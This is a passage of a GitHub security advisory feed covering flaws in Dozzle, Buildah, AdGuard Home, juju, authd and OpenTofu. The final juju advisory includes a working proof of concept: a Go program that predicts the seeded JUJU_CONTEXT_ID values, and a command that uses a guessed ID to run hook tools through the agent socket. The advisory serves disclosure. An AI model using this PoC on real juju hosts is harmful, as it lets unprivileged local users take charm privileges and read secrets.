            <uri>https://github.com/advisories/GHSA-3h3x-2hwv-hr52</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-01T21:31:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/amir20/dozzle] Dozzle uses unsafe hash for passwords]]></title>
        <id>https://github.com/advisories/GHSA-w7qr-q9fh-fj35</id>
        <link href="https://github.com/advisories/GHSA-w7qr-q9fh-fj35"/>
        <updated>2024-10-09T21:46:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The app uses sha-256 as the hash for passwords. The app should switch to bcrypt.</p>
<h3 id="details">Details</h3>
<p>SHA-256 is a message digest hash, and not classified as secure for password hashing. Message digest hashes are designed to be fast, while password hashing mechanisms are designed with certain cryptographic properties (e.g. slow) to protect against vulnerabilities. Refer to the links below for more information:</p>
<ul>
<li><a href="https://security.stackexchange.com/questions/195563/why-is-sha-256-not-good-for-passwords">https://security.stackexchange.com/questions/195563/why-is-sha-256-not-good-for-passwords</a></li>
<li><a href="https://stackoverflow.com/questions/11624372/best-practice-for-hashing-passwords-sha256-or-sha512">https://stackoverflow.com/questions/11624372/best-practice-for-hashing-passwords-sha256-or-sha512</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html#pre-hashing-passwords-with-bcrypt">https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html#pre-hashing-passwords-with-bcrypt</a></li>
</ul>
<h3 id="poc">PoC</h3>
<p>N/A</p>
<h3 id="impact">Impact</h3>
<p>It leaves users susceptible to rainbow table attacks</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/amir20/dozzle/security/advisories/GHSA-w7qr-q9fh-fj35">https://github.com/amir20/dozzle/security/advisories/GHSA-w7qr-q9fh-fj35</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47182">https://nvd.nist.gov/vuln/detail/CVE-2024-47182</a></li>
<li><a href="https://github.com/amir20/dozzle/commit/de79f03aa3dbe5bb1e154a7e8d3dccbd229f3ea3">https://github.com/amir20/dozzle/commit/de79f03aa3dbe5bb1e154a7e8d3dccbd229f3ea3</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-3163">https://pkg.go.dev/vuln/GO-2024-3163</a></li>
<li><a href="https://github.com/advisories/GHSA-w7qr-q9fh-fj35">https://github.com/advisories/GHSA-w7qr-q9fh-fj35</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w7qr-q9fh-fj35</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-10-09T21:46:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/buildah] Buildah allows arbitrary directory mount]]></title>
        <id>https://github.com/advisories/GHSA-586p-749j-fhwp</id>
        <link href="https://github.com/advisories/GHSA-586p-749j-fhwp"/>
        <updated>2024-10-09T19:15:03.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in Buildah. Cache mounts do not properly validate that user-specified paths for the cache are within our cache directory, allowing a <code>RUN</code> instruction in a Container file to mount an arbitrary directory from the host (read/write) into the container as long as those files can be accessed by the user running Buildah.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9675">https://nvd.nist.gov/vuln/detail/CVE-2024-9675</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-9675">https://access.redhat.com/security/cve/CVE-2024-9675</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2317458">https://bugzilla.redhat.com/show_bug.cgi?id=2317458</a></li>
<li><a href="https://github.com/advisories/GHSA-586p-749j-fhwp">https://github.com/advisories/GHSA-586p-749j-fhwp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-586p-749j-fhwp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-09T15:32:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/AdguardTeam/AdGuardHome] Adguard Home arbitrary file read vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-9cp9-8gw2-8v7m</id>
        <link href="https://github.com/advisories/GHSA-9cp9-8gw2-8v7m"/>
        <updated>2024-10-08T22:30:53.000Z</updated>
        <content type="html"><![CDATA[<p>An arbitrary file read vulnerability in Adguard Home before v0.107.52 allows authenticated attackers to access arbitrary files as root on the underlying Operating System via placing a crafted file into a readable directory.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36814">https://nvd.nist.gov/vuln/detail/CVE-2024-36814</a></li>
<li><a href="https://github.com/AdguardTeam/AdGuardHome">https://github.com/AdguardTeam/AdGuardHome</a></li>
<li><a href="https://github.com/AdguardTeam/AdGuardHome/blob/7c002e1a99b9b4e4a40e8c66851eda33e666d52d/internal/filtering/http.go#L23C1-L51C2">https://github.com/AdguardTeam/AdGuardHome/blob/7c002e1a99b9b4e4a40e8c66851eda33e666d52d/internal/filtering/http.go#L23C1-L51C2</a></li>
<li><a href="https://github.com/itz-d0dgy">https://github.com/itz-d0dgy</a></li>
<li><a href="https://happy-little-accidents.pages.dev/posts/CVE-2024-36814">https://happy-little-accidents.pages.dev/posts/CVE-2024-36814</a></li>
<li><a href="https://github.com/AdguardTeam/AdGuardHome/commit/e8fd4b187287a562cbe9018999e5ea576b4c7d68">https://github.com/AdguardTeam/AdGuardHome/commit/e8fd4b187287a562cbe9018999e5ea576b4c7d68</a></li>
<li><a href="https://github.com/AdguardTeam/AdGuardHome/releases/tag/v0.107.53">https://github.com/AdguardTeam/AdGuardHome/releases/tag/v0.107.53</a></li>
<li><a href="https://github.com/advisories/GHSA-9cp9-8gw2-8v7m">https://github.com/advisories/GHSA-9cp9-8gw2-8v7m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9cp9-8gw2-8v7m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-08T21:31:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/juju/juju] Vulnerable juju introspection abstract UNIX domain socket]]></title>
        <id>https://github.com/advisories/GHSA-xwgj-vpm9-q2rq</id>
        <link href="https://github.com/advisories/GHSA-xwgj-vpm9-q2rq"/>
        <updated>2024-10-09T22:49:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An abstract UNIX domain socket responsible for introspection is available without authentication locally to any user with access to the network namespace where the local juju agent is running.</p>
<p>On a juju controller agent, denial of service can be performed by using the <code>/leases/revoke</code> endpoint. Revoking leases in juju can cause availability issues.</p>
<p>On a juju machine agent that is hosting units, disabling the unit component can be performed using the <code>/units</code> endpoint with a "stop" action.</p>
<h3 id="patches">Patches</h3>
<p>Patch: <a href="https://github.com/juju/juju/commit/43f0fc59790d220a457d4d305f484f62be556d3b">https://github.com/juju/juju/commit/43f0fc59790d220a457d4d305f484f62be556d3b</a>
Patched in:</p>
<ul>
<li>3.5.4</li>
<li>3.4.6</li>
<li>3.3.7</li>
<li>3.1.10</li>
<li>2.9.51</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/introspection/worker.go#L125">https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/introspection/worker.go#L125</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/juju/juju/security/advisories/GHSA-xwgj-vpm9-q2rq">https://github.com/juju/juju/security/advisories/GHSA-xwgj-vpm9-q2rq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8038">https://nvd.nist.gov/vuln/detail/CVE-2024-8038</a></li>
<li><a href="https://github.com/juju/juju/commit/43f0fc59790d220a457d4d305f484f62be556d3b">https://github.com/juju/juju/commit/43f0fc59790d220a457d4d305f484f62be556d3b</a></li>
<li><a href="https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/introspection/worker.go#L125">https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/introspection/worker.go#L125</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-3175">https://pkg.go.dev/vuln/GO-2024-3175</a></li>
<li><a href="https://github.com/advisories/GHSA-xwgj-vpm9-q2rq">https://github.com/advisories/GHSA-xwgj-vpm9-q2rq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xwgj-vpm9-q2rq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-03T16:53:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/juju/juju] Vulnerable juju hook tool abstract UNIX domain socket]]></title>
        <id>https://github.com/advisories/GHSA-8v4w-f4r9-7h6x</id>
        <link href="https://github.com/advisories/GHSA-8v4w-f4r9-7h6x"/>
        <updated>2024-10-09T22:40:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When combined with an attack of <code>JUJU_CONTEXT_ID</code>, any user on the local system with access to the default network namespace may connect to the <code>@/var/lib/juju/agents/unit-xxxx-yyyy/agent.socket</code> and perform actions that are normally reserved to a juju charm.</p>
<h3 id="patches">Patches</h3>
<p>Patch: <a href="https://github.com/juju/juju/commit/2f2ec128ef5a8ca81fc86ae79cfcdbab0007c206">https://github.com/juju/juju/commit/2f2ec128ef5a8ca81fc86ae79cfcdbab0007c206</a>
Patched in:</p>
<ul>
<li>3.5.4</li>
<li>3.4.6</li>
<li>3.3.7</li>
<li>3.1.10</li>
<li>2.9.51</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>No workarounds available.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/juju/juju/security/advisories/GHSA-mh98-763h-m9v4">GHSA-mh98-763h-m9v4</a>
<a href="https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/uniter/paths.go#L222">https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/uniter/paths.go#L222</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/juju/juju/security/advisories/GHSA-8v4w-f4r9-7h6x">https://github.com/juju/juju/security/advisories/GHSA-8v4w-f4r9-7h6x</a></li>
<li><a href="https://github.com/juju/juju/security/advisories/GHSA-mh98-763h-m9v4">https://github.com/juju/juju/security/advisories/GHSA-mh98-763h-m9v4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8037">https://nvd.nist.gov/vuln/detail/CVE-2024-8037</a></li>
<li><a href="https://github.com/juju/juju/commit/2f2ec128ef5a8ca81fc86ae79cfcdbab0007c206">https://github.com/juju/juju/commit/2f2ec128ef5a8ca81fc86ae79cfcdbab0007c206</a></li>
<li><a href="https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/uniter/paths.go#L222">https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/uniter/paths.go#L222</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-3174">https://pkg.go.dev/vuln/GO-2024-3174</a></li>
<li><a href="https://github.com/advisories/GHSA-8v4w-f4r9-7h6x">https://github.com/advisories/GHSA-8v4w-f4r9-7h6x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8v4w-f4r9-7h6x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-03T16:53:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/ubuntu/authd] PAM module may allow accessing with the credentials of another user]]></title>
        <id>https://github.com/advisories/GHSA-x5q3-c8rm-w787</id>
        <link href="https://github.com/advisories/GHSA-x5q3-c8rm-w787"/>
        <updated>2024-10-09T22:50:16.000Z</updated>
        <content type="html"><![CDATA[<p>Authd PAM module up to version 0.3.4 can allow broker-managed users to impersonate any other user managed by the same broker and perform any PAM operation with it, including authenticating as them.</p>
<p>This is possible using tools such as <code>su</code>, <code>sudo</code> or <code>ssh</code> (and potentially others) that, so far, do not ensure that the PAM user at the end of the transaction is matching the one who initiated the transaction.</p>
<p>Authd 0.3.5 fixes this by not allowing changing the user unless it was never set before in the PAM stack.</p>
<p><code>su</code> version that will include <a href="https://github.com/util-linux/util-linux/pull/3206">https://github.com/util-linux/util-linux/pull/3206</a> will not be affected
<code>ssh</code> version that will include <a href="https://github.com/openssh/openssh-portable/pull/521">https://github.com/openssh/openssh-portable/pull/521</a> will not be affected
<code>sudo</code> version that will include <a href="https://github.com/sudo-project/sudo/pull/412">https://github.com/sudo-project/sudo/pull/412</a> will not be affected
<code>login</code> not affected
<code>passwd</code> not affected</p>
<details>
<summary>Old report</summary>

<h3 id="summary">Summary</h3>
<p>An user can access as another user using its own credentials</p>
<h3 id="details">Details</h3>
<p>I feel we’ve a security issue that is due to the fact that we allow changing the user in the cases in which that’s already provided by PAM, I’ve not tested this using the entra-id broker but it’s reproducible with the example one, but unless I’m missing something it should be independent from the broker in use.</p>
<p>Basically, by going to the user selection page we allow to login as any user by entering the use own credentials.</p>
<p>See for example: <a href="https://asciinema.org/a/VIcjpDImomaGu0wxsJJxNdmlf">https://asciinema.org/a/VIcjpDImomaGu0wxsJJxNdmlf</a> or <a href="https://asciinema.org/a/CV3D1gaEhn2yclqSMKCnifYPo">https://asciinema.org/a/CV3D1gaEhn2yclqSMKCnifYPo</a>  </p>
<p>Basically it’s possible to logging in as <code>user1</code> using the credentials of <code>user2</code> or <code>user3</code>.</p>
<p>The issue doesn’t affect login or passwd, but it does affect <code>su</code> and <code>sshd</code>, since in both cases they don’t check if the <code>PAM_USER</code> changed before the final authentication.</p>
<p>Now, while those tools should likely be fixed to only read the PAM_USER once pam gave them the final ok, I think authd should not allow changing the user at all when it has been provided by PAM.</p>
</details>
### References

<ul>
<li><a href="https://github.com/ubuntu/authd/security/advisories/GHSA-x5q3-c8rm-w787">https://github.com/ubuntu/authd/security/advisories/GHSA-x5q3-c8rm-w787</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9313">https://nvd.nist.gov/vuln/detail/CVE-2024-9313</a></li>
<li><a href="https://github.com/ubuntu/authd/commit/63e527496b013bed46904c1c58be593c13ebdce5">https://github.com/ubuntu/authd/commit/63e527496b013bed46904c1c58be593c13ebdce5</a></li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2024-9313">https://www.cve.org/CVERecord?id=CVE-2024-9313</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-3181">https://pkg.go.dev/vuln/GO-2024-3181</a></li>
<li><a href="https://github.com/advisories/GHSA-x5q3-c8rm-w787">https://github.com/advisories/GHSA-x5q3-c8rm-w787</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x5q3-c8rm-w787</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-03T16:53:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/opentofu/opentofu] OpenTofu potential leaking of secret variable values when using static evaluation in v1.8]]></title>
        <id>https://github.com/advisories/GHSA-wpr2-j6gr-pjw9</id>
        <link href="https://github.com/advisories/GHSA-wpr2-j6gr-pjw9"/>
        <updated>2024-10-09T22:51:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Users who have opted into static evaluation of module sources, versions, and backend configurations may be at risk of exposing sensitive variables and locals.  This is a workflow that should not be possible and explicitly show errors.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Check that you are not using sensitive variables in module sources and versions, as well as backend configurations.  The patch will add explicit errors and prevent this from being possible.</p>
<h3 id="examples">Examples</h3>
<pre><code class="language-hcl">variable "backend_path" {
        type = string
        sensitive = true
}

terraform {
        backend "local" {
                path = var.backend_path
        }
}
</code></pre>
<pre><code class="language-hcl">variable "mod_info" {
        type = string
        sensitive = true
}

module "foo" {
        source = var.mod_info
        //version = var.mod_info
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/opentofu/opentofu/security/advisories/GHSA-wpr2-j6gr-pjw9">https://github.com/opentofu/opentofu/security/advisories/GHSA-wpr2-j6gr-pjw9</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-3182">https://pkg.go.dev/vuln/GO-2024-3182</a></li>
<li><a href="https://github.com/advisories/GHSA-wpr2-j6gr-pjw9">https://github.com/advisories/GHSA-wpr2-j6gr-pjw9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wpr2-j6gr-pjw9</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-10-03T16:51:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/juju/juju] JUJU_CONTEXT_ID is a predictable authentication secret]]></title>
        <id>https://github.com/advisories/GHSA-mh98-763h-m9v4</id>
        <link href="https://github.com/advisories/GHSA-mh98-763h-m9v4"/>
        <updated>2024-10-09T22:48:19.000Z</updated>
        <content type="html"><![CDATA[<p><code>JUJU_CONTEXT_ID</code> is the authentication measure on the unit hook tool abstract domain socket. It looks like <code>JUJU_CONTEXT_ID=appname/0-update-status-6073989428498739633</code>.</p>
<p>This value looks fairly unpredictable, but due to the random source used, it is highly predictable.</p>
<p><code>JUJU_CONTEXT_ID</code> has the following components:</p>
<ul>
<li>the application name</li>
<li>the unit number</li>
<li>the hook being currently run</li>
<li>a uint63 decimal number</li>
</ul>
<p>On a system the application name and unit number can be deduced by reading the structure of the filesystem.
The current hook being run is not easily deduce-able, but is a limited set of possible values, so one could try them all.
Finally the random number, this is generated from a non cryptographically secure random source. Specifically the random number generator built into the go standard library, using the current unix time in seconds (at startup) as the seed.</p>
<p>There is no rate limiting on the abstract domain socket, the only limiting factor is time (window of time the hook is run) and memory (how much memory is available to facilitate all the connections).</p>
<h3 id="impact">Impact</h3>
<p>On a juju machine (non-kubernetes) or juju charm container (on kubernetes), an unprivileged user in the same network namespace can connect to an abstract domain socket and guess the JUJU_CONTEXT_ID value. This gives the unprivileged user access to the same information and tools as the juju charm. This information could be secrets that give broader access.</p>
<h3 id="patches">Patches</h3>
<p>Patch: <a href="https://github.com/juju/juju/commit/ecd7e2d0e9867576b9da04871e22232f06fa0cc7">https://github.com/juju/juju/commit/ecd7e2d0e9867576b9da04871e22232f06fa0cc7</a>
Patched in:</p>
<ul>
<li>3.5.4</li>
<li>3.4.6</li>
<li>3.3.7</li>
<li>3.1.10</li>
<li>2.9.51</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround. Upgrade will be required.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/juju/juju/blob/a5b7876263365977bd3e583f5325facdae73fbe4/worker/uniter/runner/context/contextfactory.go#L152">https://github.com/juju/juju/blob/a5b7876263365977bd3e583f5325facdae73fbe4/worker/uniter/runner/context/contextfactory.go#L152</a>
<a href="https://github.com/juju/juju/blob/a5b7876263365977bd3e583f5325facdae73fbe4/worker/uniter/runner/context/contextfactory.go#L164">https://github.com/juju/juju/blob/a5b7876263365977bd3e583f5325facdae73fbe4/worker/uniter/runner/context/contextfactory.go#L164</a></p>
<h3 id="poc">PoC</h3>
<p>With a contrived example, a charm that sleeps indefinitely on its first hook, install. This charm is called sleepy.</p>
<pre><code>.
|-- hooks
|   `-- install
#!/bin/sh
sleep 10000
|-- manifest.yaml
bases:
  - name: ubuntu
    channel: 22.04/stable
    architectures:
      - amd64
|-- metadata.yaml
name: sleepy
summary: a sleepy charm
description: a sleepy charm that sleeps on install
`-- revision
1
</code></pre>
<p>With sleepy deployed into a model, we have a unit with the name <code>sleepy/0</code> and an tag of <code>unit-sleepy-0</code>.</p>
<p>With access to the log file we can very quickly get the start time of the unit:</p>
<pre><code>ubuntu@juju-5e40c0-0:~$ cat /var/log/juju/unit-sleepy-0.log | grep 'unit "sleepy/0" started'
2024-08-06 05:10:07 INFO juju.worker.uniter uniter.go:363 unit "sleepy/0" started
</code></pre>
<p>If we don't have access to the log, we could get pretty close by trying every second between when log file was created and now:</p>
<pre><code>nobody@juju-5e40c0-0:/var/log/juju$ cat unit-sleepy-0.log
cat: unit-sleepy-0.log: Permission denied
nobody@juju-5e40c0-0:/var/log/juju$ stat unit-sleepy-0.log
  File: unit-sleepy-0.log
  Size: 1403      	Blocks: 8          IO Block: 4096   regular file
Device: 10302h/66306d	Inode: 25967076    Links: 1
Access: (0640/-rw-r-----)  Uid: (  104/  syslog)   Gid: (    4/     adm)
Access: 2024-08-06 05:10:48.686975042 +0000
Modify: 2024-08-06 05:10:07.159133215 +0000
Change: 2024-08-06 05:10:07.159133215 +0000
 Birth: 2024-08-06 05:10:06.965129276 +0000
</code></pre>
<p>We can then pass that into this program:</p>
<pre><code>package main

import (
    "flag"
    "fmt"
    "math/rand"
    "time"
)

func main() {
    var unitName string
    var unitStartLogTime string
    var currentHook string
    flag.StringVar(&amp;unitName, "u", "sleepy/0", "")
    flag.StringVar(&amp;unitStartLogTime, "t", "2024-08-06 05:10:07", "time when the last 'INFO juju.worker.uniter uniter.go:363 unit %q started' log was written to /var/log/juju/unit-name-0.log")
    flag.StringVar(&amp;currentHook, "h", "install", "the current hook that is running right now")
    flag.Parse()

    t, err := time.Parse("2006-01-02 15:04:05", unitStartLogTime)
    if err != nil {
        panic(err)
    }

    sources := []rand.Source{
        rand.NewSource(t.Unix()),
        rand.NewSource(t.Unix() - 1),
        rand.NewSource(t.Unix() - 2),
    }

    for i := 0; i &lt; 10; i++ {
        for _, source := range sources {
            fmt.Printf("%s-%s-%d\n", unitName, currentHook, source.Int63())
        }
    }
}
</code></pre>
<p>This program will give us a list of <code>JUJU_CONTEXT_ID</code>s to try. We just need to try each one. In this case it was the first one, because we had enough information.</p>
<pre><code>$ go run . -u sleepy/0 -t "2024-08-06 05:10:07" -h install
sleepy/0-install-7349430268617352851
sleepy/0-install-2171542415131519293
sleepy/0-install-6564961386023494624
sleepy/0-install-59904244413115609
sleepy/0-install-6073989428498739633
sleepy/0-install-2504995199508561544
sleepy/0-install-1526670560532335303
sleepy/0-install-2568216045630615950
sleepy/0-install-8047402353801897930
</code></pre>
<p>Unfortunately, this worked too well.</p>
<pre><code>nobody@juju-5e40c0-0:/var/log/juju$ JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-sleepy-0/agent.socket JUJU_CONTEXT_ID=sleepy/0-install-7349430268617352851 /var/lib/juju/tools/unit-sleepy-0/is-leader
True
</code></pre>
<p>With a more sophisticated attack, this could discover all the units on the machine, using the update-status hook, try a few thousand attempts per second to guess the start time and the current offset in the random source, then using secret-get hook tool, get some sort of secret, such as credentials to a system.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/juju/juju/security/advisories/GHSA-mh98-763h-m9v4">https://github.com/juju/juju/security/advisories/GHSA-mh98-763h-m9v4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-7558">https://nvd.nist.gov/vuln/detail/CVE-2024-7558</a></li>
<li><a href="https://github.com/juju/juju/commit/ecd7e2d0e9867576b9da04871e22232f06fa0cc7">https://github.com/juju/juju/commit/ecd7e2d0e9867576b9da04871e22232f06fa0cc7</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-3173">https://pkg.go.dev/vuln/GO-2024-3173</a></li>
<li><a href="https://github.com/advisories/GHSA-mh98-763h-m9v4">https://github.com/advisories/GHSA-mh98-763h-m9v4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mh98-763h-m9v4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-03T16:49:58.000Z</published>
    </entry>
</feed>